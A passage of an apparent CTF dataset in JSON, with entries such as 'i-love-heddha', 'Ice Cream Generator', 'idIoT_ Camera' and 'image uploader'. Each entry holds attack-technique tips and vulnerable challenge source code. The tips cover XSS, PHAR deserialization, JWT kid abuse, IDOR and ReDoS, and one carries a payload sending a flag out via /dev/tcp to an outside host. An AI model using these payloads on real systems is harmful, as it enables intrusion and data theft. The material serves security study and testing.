        "key": "```python\nclass Generator():  \n    DIGITS = 8  \n    def __init__(self, seed):  \n        self.seed = seed  \n        assert(len(str(self.seed)) == self.DIGITS)\n\n    def getNum(self):  \n        self.seed = int(str(self.seed**2).rjust(self.DIGITS*2, \"0\")[self.DIGITS//2:self.DIGITS + self.DIGITS//2])  \n        return self.seed\n\nr1 = Generator(random.randint(10000000, 99999999))  \nr2 = Generator(random.randint(10000000, 99999999))\n\n...\n\nif query.lower() == \"r\" and query_counter < 3:  \n    print(r1.getNum() * r2.getNum())\n```"
    },
    {
        "name": "i-love-heddha",
        "write_up": "dataset/raw/i-love-heddha.md",
        "type": "web",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When navigating a website in a CTF challenge and encountering error messages or unusual responses, checking `robots.txt` can lead to discovering hidden or restricted directories. This is a common technique for uncovering paths that developers intend to hide from web crawlers but can be exploited to find potential vectors for deeper access.",
            "In scenarios where access to a specific resources requires passing certain checks, modifying HTTP request headers can bypass these restrictions. The common headers to modify include `User-Agent`, to mimic a specific browser requirement, and `Referer`, to fake the origin of the request. For content encoded in Base64, using command line tools like `curl` to fetch the content followed by a tool to decode Base64 can reveal hidden messages or flags.\n   - To pass a `User-Agent` check, use: `-A \"Builder browser 1.0.1\"`\n   - To pass a `Referer` check, use: `-H \"Referer: hackover.18\"`\n   - To decode a Base64 encoded string: `| base64 -D`"
        ],
        "key": "```python\nfrom flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/flag/flag.txt')\ndef flag():\n    is_allowed = request.cookies.get('isAllowed')\n    user_agent = request.headers.get('User-Agent')\n    referer = request.headers.get('Referer')\n\n    if is_allowed != 'true':\n        return \"Access Denied\", 403\n\n    if user_agent != 'Builder browser 1.0.1':\n        return \"You are using the wrong browser, 'Builder browser 1.0.1' is required\", 403\n\n    if referer != 'hackover.18':\n        return \"Invalid Referer\", 403\n\n    flag = \"hackover18{4ngryW3bS3rv3rS4ysN0}\"\n    response = make_response(flag)\n    response.headers['Content-Type'] = 'text/plain'\n    return response\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n```"
    },
    {
        "name": "ICAN'TBELIEVEIT'SNOTCRYPTO",
        "write_up": "dataset/raw/ICAN'TBELIEVEIT'SNOTCRYPTO.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 314,
        "max_score": 233123.2321,
        "difficulty": 0.001346927104482265,
        "knowledge": [
            "When faced with a challenge that requires analyzing a mathematical or algorithmic process to pass a specific condition (e.g., a step count requirement), research known problems or conjectures that might match the challenge's description. The Collatz conjecture, for example, can be applied if the challenge involves iterative transformations on numbers translating into step counts toward a specific condition. This approach can uncover shortcuts or optimized solutions leveraging prior mathematical work.",
            "Converting numbers between different bases or representations can be a critical step in solving challenges. When a challenge involves manipulations or conditions on lists or arrays that seem arbitrary, consider if those lists might represent numbers in a non-standard base or split across multiple arrays. The ability to translate back and forth between these bespoke representations and a more conventional form (like integers) can be key to understanding the challenge's underlying logic and crafting a solution. A Python snippet for converting a number to two lists, each representing bits of the base-6 representation of the number, then back to its original form, is an example of such a tactic:\n   - Conversion from a single integer to two lists (representing base-6 digits split across the lists):\n     ```python\n     def to_lists(num):\n         l1 = []\n         l2 = []\n         while num:\n             digit = num % 6\n             l1.append(digit & 1)\n             l2.append(digit >> 1)\n             num //= 6\n         return l1, l2\n     ```\n   - Conversion back from the two lists to the original integer:\n     ```python\n     def from_lists(l1, l2):\n         num, mul = 0, 1\n         for i in range(len(l1)):\n             digit = l1[i] | (l2[i] << 1)\n             num += digit * mul\n             mul *= 6\n         return num\n     ```"
        ],
        "key": "```python\ndef step(l1, l2):\n    carry = 0\n    for i in range(len(l1)):\n        total = l1[i] + l2[i] * 2 + carry\n        l1[i] = total % 2\n        l2[i] = (total // 2) % 3\n        carry = total // 6\n    if carry:\n        l1.append(carry % 2)\n        l2.append((carry // 2) % 3)\n```"
    },
    {
        "name": "Ice Cream Generator",
        "write_up": "dataset/raw/Ice Cream Generator.md",
        "type": "misc",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When facing LCG (Linear Congruential Generator) challenges and partial parameters are known, specific steps can be followed to recover the remaining parameters. If the modulus \\(p\\) and the seed are known but the multiplier \\(a\\) and increment \\(c\\) are unknown, you can utilize generated numbers \\(X_1, X_2, X_3, ...\\). First, recover \\(a\\) using the formula \\(a \\equiv \\frac{X_3 - X_2}{X_2 - X_1} \\mod m\\). Then, recover \\(c\\) with \\(c \\equiv X_2 - aX_1 \\mod m\\). This method becomes practical when at least three consecutive generated numbers \\(X_1, X_2, X_3\\) can be obtained or derived from the application's output.",
            "In LCG challenges where direct access to generated random values is not provided, indirect methods can be employed to leak or deduce these values. This often involves manipulating application logic or output to reveal hidden internal states. For instance, if an application uses LCG-generated values to manipulate data in a predictable way, sequences of operations can be crafted to isolate and retrieve individual generated values. This typically requires understanding how operations affect data and finding sequences that simplify or reveal the LCG's output. This approach was applied by leveraging sequence operations (add, subtract, multiply, divide) on controlled input to deduce LCG parameters indirectly.\n\nExample payload to recover parameter `a`:\n- Initial state with three bowls: `[0, 0, 0]`\n- Perform operations:\n  1. Add \\(X_2\\) to bowl 1: `[X_2, 0, 0]`\n  2. Add \\(X_3\\) to bowl 2: `[X_2, X_3, 0]`\n  3. Subtract bowl 2 from bowl 1: `[(X_2 - X_3) mod p, 0, 0]`\n  4. Add \\(X_1\\) to bowl 2: `[(X_2 - X_3) mod p, X_1, 0]`\n  5. Add \\(X_2\\) to bowl 3: `[(X_2 - X_3) mod p, X_1, X_2]`\n  6. Subtract bowl 3 from bowl 2: `[(X_2 - X_3) mod p, (X_1 - X_2) mod p, 0]`\n  7. Divide bowl 1 by bowl 2: `[a = ((X_2 - X_3) / (X_1 - X_2)) mod p, 0, 0]`\n- Use the operation results to calculate `a`."
        ],
        "key": "```python  \n#!/usr/local/bin/python  \nfrom Crypto.Util.number import *  \nfrom os import urandom  \nfrom flag import flag\n\nclass lcg:  \n   def __init__(self, p):  \n       while (a:=bytes_to_long(urandom(16))) > p:  \n           pass  \n       while (b:=bytes_to_long(urandom(16))) > p:  \n           pass  \n       self.a, self.b, self.p = a, b, p  \n  \n   seed = 1337\n\n   def gen_next(self):  \n       self.seed = (self.a*self.seed + self.b) % self.p  \n       return self.seed\n\nclass order:  \n   def __init__(self, p):  \n       self.p = p\n\n       self.inner_lcg = lcg(p)  \n  \n       for i in range(1337):  \n           self.inner_lcg.gen_next()\n\n       self.flavors = [self.inner_lcg.gen_next() for i in range(1338)]\n\n       self.flavor_map = {i:self.flavors[i] for i in [1,2,3,4,5,6]}  \n       self.private = {i:self.flavors[i] for i in [1,2,3,4,5,6,1337]}  \n  \n   bowls = [0, 0, 0]  \n   used = {1:0, 2:0, 3:0, 4:0, 5:0, 6:0}  \n   recipe = []\n\n   def make_bowl(self):  \n       global flavor_indices  \n       self.bowls = [0, 0, 0]  \n       self.recipe = []  \n       new = {}  \n       available = []  \n       for i, n in self.used.items():  \n           if n == 0:  \n               new[i] = 0  \n               available += [i]  \n       self.used = new  \n       print(\"\\nREMAINING FLAVORS: \")  \n       for i in available:  \n           print(f\"Flavor {i} - {flavor_indices[i]}\")  \n       while True:  \n           command = input(\"\\nAdd, combine, or finish? \")  \n           if command.lower() == \"add\":  \n               try:  \n                   add = input(\"\\nGive a flavor and a bowl: \").rsplit(\" \", 1)  \n                   self.add(*add)  \n               except Exception as e:  \n                   print()  \n                   print(e)  \n           elif command.lower() == \"combine\":  \n               try:  \n                   combination = input(\"\\nGive two bowls and an operation: \").split()  \n                   assert len(combination) == 3, \"Invalid Input Length\"  \n                   self.combine_bowl(*combination)  \n               except Exception as e:  \n                   print()  \n                   print(e)  \n           elif command.lower() == \"finish bowl\":  \n               self.finish_bowl()  \n           elif command.lower() == \"finish\":  \n               self.finish()  \n               break  \n           elif command.lower() == \"exit\":  \n               exit(1)  \n           else:  \n               print(\"\\nPlease give a valid input.\")  \n\n   def mod(self):  \n       self.bowls = [i % self.p for i in self.bowls]\n\n   def add(self, flavor, bowl):  \n       assert \"0\" < bowl < \"4\", \"Invalid Bowl\"  \n       bowl = int(bowl) - 1  \n       global flavor_names  \n       if flavor not in [\"1\", \"2\", \"3\", \"4\", \"5\", \"6\"]:  \n           try:  \n               if self.used[flavor_names[flavor]] < 5:  \n                   self.bowls[bowl] += self.flavor_map[flavor_names[flavor]]  \n                   self.used[flavor_names[flavor]] += 1  \n                   self.recipe += [[flavor_names[flavor], bowl]]  \n               else:  \n                   print(f\"\\nCannot order {flavor} due to stock issues.\")  \n           except:  \n               print(\"\\nInvalid Flavor\")  \n       else:  \n           try:  \n               flavor = int(flavor)  \n               if self.used[flavor] < 5:  \n                   self.bowls[bowl] += self.flavor_map[flavor]  \n                   self.used[flavor] += 1  \n                   self.recipe += [[flavor, bowl]]  \n               else:  \n                   print(f\"\\nCannot order {flavor} due to stock issues.\")  \n           except:  \n               print(\"\\nInvalid Flavor\")  \n  \n   def combine_bowl(self, a, b, op):  \n       assert op in ['add', 'sub', 'mult', 'div'], \"Invalid Operation. Please choose either 'add', 'sub', 'mult', or 'div'.\"  \n       assert \"0\" < a < \"4\" and \"0\" < b < \"4\" and a != b, \"Invalid Bowl\"  \n       a = int(a) - 1  \n       b = int(b) - 1  \n       if op == 'add':  \n           self.bowls[a] += self.bowls[b]  \n       elif op == 'sub':  \n           self.bowls[a] -= self.bowls[b]  \n       elif op == 'mult':  \n           self.bowls[a] *= self.bowls[b]  \n       elif op == 'div':  \n           assert self.bowls[b] != 0, \"Empty Bowl for Division\"  \n           self.bowls[a] *= pow(self.bowls[b], -1, self.p)  \n       else:  \n           print(\"\\nwtf\")  \n           exit(1)  \n       self.recipe += [[op, a, b]]  \n       self.bowls[b] = 0  \n       self.mod()  \n  \n   def finish_bowl(self):  \n       unique = 0  \n       for i, n in self.used.items():  \n           if n and n != 1337:  \n               unique += 1  \n       if unique < min(3, len(self.used)):  \n           print(\"\\nAdd more flavor!\")  \n           return False  \n       recipe = str(self.recipe).replace(' ', '')  \n       signature = sum(self.bowls) % self.p  \n       self.bowls = [0, 0, 0]  \n       self.recipe = []  \n       for i in self.used:  \n           if self.used[i]:  \n               self.used[i] = 1337  \n       print(f\"\\nUser #: {self.p}\")  \n       print(f\"\\nRecipe: \\n{recipe}\")  \n       print(f\"\\n\\nSignature: \\n{signature}\")  \n       return True  \n  \n   def finish(self):  \n       if sum(self.bowls):  \n           if not self.finish_bowl():  \n               print(\"\\nOk the bowls will be dumped.\")  \n       print(\"\\nOrder done!\")  \n       return True\n\n   def verify(self, recipe, signature):  \n       bowls = [0, 0, 0]  \n       for i in recipe:  \n           try:  \n               if len(i) == 2:  \n                   bowls[i[1]] += self.private[i[0]]  \n               elif len(i) == 3:  \n                   if i[0] == 'add':  \n                       bowls[i[1]] += bowls[i[2]]  \n                   elif i[0] == 'sub':  \n                       bowls[i[1]] -= bowls[i[2]]  \n                   elif i[0] == 'mult':  \n                       bowls[i[1]] *= bowls[i[2]]  \n                   elif i[0] == 'div':  \n                       bowls[i[1]] *= pow(bowls[i[2]], -1, self.p)  \n                   bowls[i[2]] = 0  \n               bowls = [i % self.p for i in bowls]  \n           except:  \n               exit(\"\\nInvalid Recipe\")  \n       try:  \n           assert sum(bowls) % self.p == signature, \"\\nInvalid Signature\"  \n           print(\"\\nYou have successfully redeemed your lce cream!\")  \n           if signature == self.private[1337]:  \n               print(flag)  \n       except Exception as e:  \n           print(e)  \n\nflavor_names = {\"revanilla\":1, \"cryptolatte\":2, \"pwnstachio\":3,\n\"strawebrry\":4, \"miscnt\":5, \"cookie dalgo\":6, \"flaudge chocolate\":1337}  \nflavor_indices = {i:n for n, i in flavor_names.items()}\n\nintro = \\  \n\"\"\"  \n----------------------------------------------------  \n           WELCOME TO THE LCE CREAM SHOP!            \n----------------------------------------------------  \n HERE AT THE LCE CREAM SHOP WE HAVE A FEW BELIEFS  \n\n1. Don't be boring! Choose at least 3 flavors of lce cream. All of it tastes the same anyways...  \n2. Don't be repetitive! Well... that and the fact that we have some stock issues. After getting one lce cream with one flavor, you don't get to choose that flavor again.  \n3. Since I rolled my own signature system that is extremely secure, if you can manage to forge an arbitrary flavor, I'll give it to you! As long as it exists...  \n4. These aren't really beliefs anymore but we only have 6 flavors (available to the customer), and you're only allowed to order once (stock issues again smh). Choose wisely!  \n5. To help with the boringness, I will allow you to mix flavors in any way you want. But you can only use up to 5 scoops of each flavor to concoct your lce cream (once again stock issues).  \n6. I AM ONLY ACCEPTING ONE RECIEPT. If the first fails, too bad.  \n7. I heard there's a special flavor called \"flaudge chocolate\", it's like the 1337th flavor or something.  \n8. Orders can have multiple lce cream mixtures, as long as they follow the rules above.  \n9. I am accepting reciepts for TAX PURPOSES only.  \n10. Each scoop costs $5 (stock issues AGAIN).  \n11. The reciept itself costs $1.  \n12. Everything is free. Have fun!  \n13. Zero indexing sucks. Here at LCE CREAM SHOP we use one indexing.\n\nOh yeah here are the options:\"\"\"\n\noptions = \\  \n\"\"\"  \nOPTIONS:  \n(1) Generate order  \n(2) View flavors  \n(3) Redeem a reciept  \n(4) Exit  \nChoice: \"\"\"\n\nprint(intro)\n\nwhile True:  \n   choice = input(options)  \n   if choice == \"1\":  \n       if 'user' in vars():  \n           print(\"\\nYou already ordered.\")  \n           continue  \n       user = order(getPrime(128))  \n       user.make_bowl()  \n       print()  \n   elif choice == \"2\":  \n       print(\"\\nThe only valid flavors are: \")  \n       [print(f\"Flavor {i} - {n}\") for i, n in flavor_indices.items() if i != 1337]  \n   elif choice == \"3\":  \n       if 'user' not in vars():  \n           print(\"\\nNo user.\")  \n       else:  \n           userid = int(input(\"\\nENTER NUMBER: \"))  \n           assert userid == user.p, \"You seem to have lost your reciept.\"  \n           recipe = input(\"\\nENTER RECIPE: \")  \n           assert all([i in \"[,]01234567abdilmstuv'\" for i in recipe]), \"\\n\\nSir, please don't put junk in my lce cream machine!\"  \n           recipe = eval(recipe, {\"__builtins__\": {}}, {\"__builtins__\": {}}) # screw json or ast.literal_eval  \n           signature = input(\"\\nENTER SIGNATURE: \")  \n           user.verify(recipe, int(signature))  \n           exit(\"\\nGoodbye.\")  \n   elif choice == \"4\":  \n       exit(\"\\nGoodbye.\")  \n   else:  \n       print(\"\\nINVALID CHOICE. Please input '1', '2', '3', or '4'\")  \n```"
    },
    {
        "name": "idIoT_ Camera",
        "write_up": "dataset/raw/idIoT_ Camera.md",
        "type": "web",
        "competition": [
            "PlaidCTF/2018",
            "https://ctftime.org/event/617/tasks/"
        ],
        "score": -1.0,
        "max_score": 800,
        "difficulty": -1,
        "knowledge": [
            "When a website's Content Security Policy (CSP) does not define restrictions for certain resource types (like `image-src` or lacking specification for `script-src`), an attacker can exploit these omissions for cross-site scripting (XSS) attacks. For `script-src` specifically, if only 'self' is specified without allowing inline javascript, an attacker can bypass this limitation by uploading a file with a JavaScript payload embedded within a legitimate file type (like audio files), and then referencing this uploaded file in a script tag to execute the payload. This technique, however, requires finding a file type and file extension that will not be served with a content type that prevents script execution in modern browsers. An example manipulation involves modifying a WAV file header to comment it out and inserting JavaScript payload afterwards, ensuring the file extension is one that the server does not recognize as an audio file, to allow for script execution in browsers.\n   \n   Example Payload in WAV File:\n\n   ```\n   00000000: 5249 4646 3d31 2f2a 5741 5645 666d 7420  RIFF=1/*WAVEfmt  \n   ...  \n   000000c0: 0000 0000 0000 0000 2a2f 0a3b 616c 6572  ........*/.;aler  \n   000000d0: 7428 3129 3b0a                           t(1);.  \n   ```",
            "Protocol smuggling or Server Name Indication (SNI) field manipulation in HTTPS requests can be used for bypassing input validation mechanisms of a server. This technique involves exploiting the fact that certain protocols, including FTP and HTTPS, may interpret payload differently, where HTTPS's Client Hello message contains an unencrypted SNI field. This field can be crafted to contain commands interpretable by another protocol, intending to smuggle commands to a server expecting a different protocol. This is especially useful when bypassing web application firewalls (WAFs) or directing payloads to unintended services within the target infrastructure. The strategy necessitates crafting an SNI field to contain the smuggled command, which leads to protocol-specific actions being taken by the server, potentially leading to unauthorized actions or information disclosure. \n\n   Example Manipulation (Not directly applicable as a payload but illustrates the concept):\n\n   ```\n   https://p8.8.8.8.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaa.127.0.0.1.xip.io:1212\n   ```\n\n   This utilizes the DNS naming (via services like xip.io) to smuggle FTP commands or other protocol-specific data through the SNI field of an HTTPS client hello message."
        ],
        "key": "```cpp\nif ( v65 > 2 && !strncasecmp(s1, \"GET\", 3uLL)  \n   || v65 > 3 && !strncasecmp(s1, \"HEAD\", 4uLL)  \n   || v65 > 3 && !strncasecmp(s1, \"POST\", 4uLL)  \n   || v65 > 2 && !strncasecmp(s1, \"PUT\", 3uLL)  \n   || v65 > 5 && !strncasecmp(s1, \"DELETE\", 6uLL)  \n   || v65 > 6 && !strncasecmp(s1, \"CONNECT\", 7uLL)  \n   || v65 > 6 && !strncasecmp(s1, \"OPTIONS\", 7uLL)  \n   || v65 > 4 && !strncasecmp(s1, \"TRACE\", 5uLL)  \n   || v65 > 4 && !strncasecmp(s1, \"PATCH\", 5uLL) )  \n```\n"
    },
    {
        "name": "idoriot",
        "write_up": "dataset/raw/idoriot.md",
        "type": "crypto",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 100,
        "max_score": 490,
        "difficulty": 0.20408163265306123,
        "knowledge": [
            "When dealing with an IDOR vulnerability, especially on a web platform without available source code, investigating the process of user interactions such as registration or login can reveal manipulation points. This is particularly useful when user identification values are exposed or hinted within the UI or response messages. In specific situations where numeric user IDs are allocated sequentially or exposed to users, altering these IDs in requests (e.g., through form data or URL parameters) could grant access to unauthorized content or functionalities. This technique is effective in environments where backend validation of user actions based on IDs is lax or assumes trust in client-side controls.",
            "Tools like Burp Suite's Repeater function can be instrumental in testing for IDOR vulnerabilities by manually altering request parameters to test how the system responds to unexpected or unauthorized input values. For instance, changing a user ID in the request body to target admin accounts or other users\u2019 data can lead to privilege escalation or unauthorized data access if the application does not properly verify the user's permissions based on the session context. This approach is particularly useful when testing security in environments where direct object references are made through client-facing data. Example payload in a POST request could look like: `username=test&password=test&user_id=0`."
        ],
        "key": "```php  \nsession_start();\n\n// Check if user is logged in  \nif (!isset($_SESSION['user_id'])) {  \n   header(\"Location: login.php\");  \n   exit();  \n}\n\n// Check if session is expired  \nif (time() > $_SESSION['expires']) {  \n   header(\"Location: logout.php\");  \n   exit();  \n}\n\n// Display user ID on landing page  \necho \"Welcome, User ID: \" . urlencode($_SESSION['user_id']);\n\n// Get the user for admin  \n$db = new PDO('sqlite:memory:');  \n$admin = $db->query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')->fetch();\n\n// Check if the user is admin  \nif ($admin['user_id'] === $_SESSION['user_id']) {  \n   // Read the flag from flag.txt  \n   $flag = file_get_contents('flag.txt');  \n   echo \"<h1>Flag</h1>\";  \n   echo \"\n\n$flag\n\n\";  \n} else {  \n   // Display the source code for this file  \n   echo \"<h1>Source Code</h1>\";  \n   highlight_file(__FILE__);  \n}  \n```"
    },
    {
        "name": "image uploader",
        "write_up": "dataset/raw/image uploader.md",
        "type": "web",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "To bypass restrictions on file wrappers and trigger deserialization attacks in PHP, you can utilize existing allowed wrappers in combination with vulnerable file handling functions. This approach is especially useful when direct usage of a targeted wrapper like `phar://` is blocked by input validation (e.g., using `preg_match()` to exclude certain schemes). By prepending an allowed wrapper and applying it to read from a restricted one, deserialization can be initiated indirectly. This technique leverages the `php://filter` stream wrapper to bypass restrictions and execute arbitrary code through deserialization, by pointing the resource to a `phar://` URL.\n   - Example payload: `php://filter/resource=phar://phar.jpeg`",
            "PHP object injection (POI) vulnerabilities can be exploited through specially crafted PHAR files to achieve remote code execution (RCE). This is viable when an application unsafely deserializes user-supplied content. By crafting a PHAR file that includes a bogus image header followed by PHP object serialization payload, attackers can leverage file upload features to execute arbitrary code. The PHAR file manipulates object's state and triggers methods such as `__destruct()` or `__wakeup()` with crafted properties to perform actions unintended by the application's logic, like writing arbitrary files or executing code. This attack vector is especially potent if the application's logic includes classes with methods that can be abused post-deserialization.\n   - Example scenario: Crafting a PHAR file masquerading as an image that, when deserialized, injects a malicious object into the application flow, resulting in the execution of arbitrary PHP code stored in the PHAR metadata. The PHAR stub can include PHP code execution payloads to be written into a file, which can be further executed via a web request."
        ],
        "key": "```php\n<?php\nclass cl1 {\n    private $key;\n    private $store;\n    private $expire;\n    private $autosave = false;\n    private $cache = [];\n    private $complete;\n\n    public function __construct($key, $store, $expire = 0) {\n        $this->key = $key;\n        $this->store = $store;\n        $this->expire = $expire;\n    }\n\n    public function cleanContents(array $contents) {\n        $cachedProperties = array_flip([\n            'path', 'dirname', 'basename', 'extension', 'filename',\n            'size', 'mimetype', 'visibility', 'timestamp', 'type',\n        ]);\n\n        foreach ($contents as $path => $object) {\n            if (is_array($object)) {\n                $contents[$path] = array_intersect_key($object, $cachedProperties);\n            }\n        }\n\n        return $contents;\n    }\n\n    public function getForStorage() {\n        $cleaned = $this->cleanContents($this->cache);\n\n        return json_encode([$cleaned, $this->complete]);\n    }\n\n    public function save() {\n        $contents = $this->getForStorage();\n\n        $this->store->set($this->key, $contents, $this->expire);\n    }\n\n    public function __destruct() {\n        if (!$this->autosave) {\n            $this->save();\n        }\n    }\n}\n\nclass cl2 {\n    private $writeTimes = 0;\n    private $options = [\n        \"data_compress\" => false,\n        \"prefix\" => \"\",\n        \"serialize\" => \"strval\",\n        \"expire\" => 111111111111\n    ];\n\n    protected function getExpireTime($expire): int {\n        return (int) $expire;\n    }\n\n    public function getCacheKey(string $name): string {\n        return $this->options['prefix'] . $name;\n    }\n\n    protected function serialize($data): string {\n        if (is_numeric($data)) {\n            return (string) $data;\n        }\n\n        $serialize = $this->options['serialize'];\n\n        return $serialize($data);\n    }\n\n    public function set($name, $value, $expire = null): bool {\n        $this->writeTimes++;\n\n        if (is_null($expire)) {\n            $expire = $this->options['expire'];\n        }\n\n        $expire = $this->getExpireTime($expire);\n        $filename = $this->getCacheKey($name);\n\n        $dir = dirname($filename);\n\n        if (!is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n\n            }\n        }\n\n        $data = $this->serialize($value);\n\n        if ($this->options['data_compress'] && function_exists('gzcompress')) {\n            $data = gzcompress($data, 3);\n        }\n\n        $data = \"\\n\" . $data;\n        $result = file_put_contents($filename, $data);\n        if ($result) {\n            return true;\n        }\n\n        return false;\n    }\n}\n?>\n```"
    },
    {
        "name": "imagehost",
        "write_up": "dataset/raw/imagehost.md",
        "type": "web",
        "competition": [
            "b01lers/2024",
            "https://ctftime.org/event/2250/tasks/"
        ],
        "score": -1,
        "max_score": 438,
        "difficulty": -1,
        "knowledge": [
            "When exploiting JSON Web Tokens (JWT) with RS256 algorithm, if the application allows the inclusion of external or user-supplied keys (as indicated by the \"kid\" header in the JWT), an attacker can host their public key, sign the token with their private key, and modify the JWT's \"kid\" header to point to the attacker's public key. This allows for the verification process to use the attacker's public key, thereby bypassing intended security checks and enabling privilege escalation or impersonation attacks if the application does not properly validate the source of the public key. Example of modified header to use attacker's public key:\n   ```\n   {\n     \"alg\": \"RS256\",\n     \"kid\": \"/path_to_attacker_public_key/attacker_public_key.pem\",\n     \"typ\": \"JWT\"\n   }\n   ```\n   Example of a payload granting admin privileges:\n   ```\n   {\n     \"user_id\": 1,\n     \"admin\": true\n   }\n   ```",
            "In cases where server-side validation improperly trusts paths or URLs provided in JWT headers (e.g., the \"kid\" field), ensuring that the referenced files (in this case, the public key) are within a controlled or intended directory is essential. This scenario shows the importance of validating not just the token's signature but also the integrity and source of the keys involved in the signature verification process. The server's validation logic should include checking if the provided path is within expected bounds, and it must reject any external or untrusted sources for keys."
        ],
        "key": "```python\ndef decode(token):  \n    headers = jwt.get_unverified_header(token)  \n    public_key = Path(headers[\"kid\"])  \n    if public_key.absolute().is_relative_to(Path.cwd()):  \n        key = public_key.read_bytes()  \n        return jwt.decode(jwt=token, key=key, algorithms=[\"RS256\"])  \n    else:  \n        return {}  \n```"
    },
    {
        "name": "Images and Words",
        "write_up": "dataset/raw/Images and Words.md",
        "type": "misc",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When using Python web applications, an import ambiguity can occur if a user-uploaded directory or file shares the same name as an expected module. This can lead to remote code execution (RCE) by uploading a malicious `__init__.py` file in a directory named the same as the target module. Such a vulnerability can be exploited in applications where the filesystem can influence module imports. For instance, uploading `__init__.py` with a payload can cause the application to execute arbitrary code if it attempts to import a module of the same name as the uploaded directory.  \nExample payload:  \n```python  \n__import__('os').system('bash -c \"/readflag>/dev/tcp/example.com/80\"')  \n```",
            "Exploiting Regular Expression Denial of Service (ReDoS) vulnerabilities can induce service delays or disruptions, compelling server processes such as Gunicorn to restart workers due to timeouts. This behavior can be leveraged to execute previously unloaded or ignored malicious scripts by forcing the application to import or process them after restart. The use of such techniques is applicable in scenarios where server-side validation or processing uses poorly crafted regular expressions that are susceptible to catastrophic backtracking.  \nExample payload: A filename or input string like `aaaaaaaaaaaaaaaaaaaaaa!` designed to cause extensive backtracking in vulnerable regular expressions."
        ],
        "key": "```python\ndef sanitize_filename(dangerous_filename):  \n   print(len(dangerous_filename))  \n   res = re.match(r'^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$', dangerous_filename)  \n   safe_filename = secrets.token_urlsafe(32)[:32] if res is None else dangerous_filename  \n   return safe_filename  \n\ndef render(filename):  \n   src = config.UPLOAD_DIR / filename  \n   with open(src, 'r') as f:  \n       text = f.read()  \n   src.unlink()  \n   dst = config.UPLOAD_DIR / (filename + '.png')  \n   with open(dst, 'wb') as f:  \n       text2image.render(text, f)  \n```\n"
    },
    {
        "name": "Immutable",
        "write_up": "dataset/raw/Immutable.md",
        "type": "crypto",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 372,
        "max_score": 488,
        "difficulty": 0.7622950819672131,
        "knowledge": [
            "In blockchain-based CTF challenges, especially with Ethereum smart contracts, utilizing the `CREATE2` opcode allows for the deployment of a contract such that its address can be predetermined and is reusable. This is because the address generated by `CREATE2` is a function of the sender's address, a salt, and the bytecode of the contract being deployed. If a contract at that address is `SELFDESTRUCT`ed, it can be redeployed to the same address by using the same parameters (sender, salt, bytecode) with `CREATE2`. This technique is crucial for scenarios requiring the dynamic update of a contract's code or logic in a controlled manner.\n\n   Example steps:\n   - Deploy a Factory Contract.\n   - Use `CREATE2` from the factory with a specific salt to deploy the target contract, ensuring its address can be precomputed and is reusable after destruction.\n   - Perform operations or fulfill certain challenge conditions.\n   - `SELFDESTRUCT` the target contract.\n   - Redeploy to the same address using `CREATE2` with the same salt and potentially updated bytecode to meet new conditions or execute further steps.",
            "The combination of creating contracts with `CREATE`, which relies on the contract creation nonce, and self-destructing contracts using `SELFDESTRUCT`, can be used to reset the nonce and thus control the address of subsequent contracts created via `CREATE`. This strategy can be essential when the challenge involves controlling or predicting contract addresses or when needing to replace a contract's functionality while maintaining its address. This approach requires careful contract architecture and a deep understanding of the Ethereum Virtual Machine (EVM) creation and destruction mechanics.\n\n   Example steps:\n   - Deploy a control or factory contract.\n   - Use `CREATE` to deploy an initial contract, influencing the contract creation nonce.\n   - Perform operations or interact with the deployed contract as necessary.\n   - Self-destruct the deployed contract to reset the nonce.\n   - Deploy a new contract using `CREATE` with intended bytecode changes, thus having control over the address if the nonce reset and other conditions (e.g., transaction sender address) remain constant."
        ],
        "key": "```python\ndef audit():\n    addr = input(\"Enter contract address: \")\n    if not is_contract(addr):\n        print(\"Address is not a contract.\")\n        return\n    if target(addr) in get_bytecode(addr):\n        print(\"Target is in contract bytecode.\")\n        return\n    proof = auth(addr)\n    print(f\"Proof: {proof}\")\n\ndef rugpull():\n    addr = input(\"Enter contract address: \")\n    proof = input(\"Enter proof: \")\n    if target(addr) not in get_bytecode(addr):\n        print(\"Target is not in contract bytecode.\")\n        return\n    if not verify_proof(addr, proof):\n        print(\"Invalid proof.\")\n        return\n    print(\"Flag: EPFL{https://youtu.be/ZgWkdQDBqiQ}\")\n\ndef is_contract(addr):\n    # Check if the address is a contract\n    return get_code_size(addr) > 0\n\ndef get_bytecode(addr):\n    # Retrieve the bytecode of the contract at the given address\n    pass\n\ndef target(addr):\n    # Calculate the target value based on the address\n    pass\n\ndef auth(addr):\n    # Generate a proof based on the address and a secret key\n    pass\n\ndef verify_proof(addr, proof):\n    # Verify the proof for the given address\n    pass\n```"
    },
    {
        "name": "Important Service",
        "write_up": "dataset/raw/Important Service.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 259,
        "max_score": 792,
        "difficulty": 0.32702020202020204,
        "knowledge": [
